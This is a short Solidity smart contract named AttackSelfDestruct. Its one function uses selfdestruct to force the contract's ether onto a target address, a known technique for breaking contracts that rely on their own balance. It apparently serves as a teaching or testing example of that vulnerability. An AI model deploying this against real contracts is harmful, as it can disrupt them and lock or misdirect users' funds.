// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract AttackSelfDestruct {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}
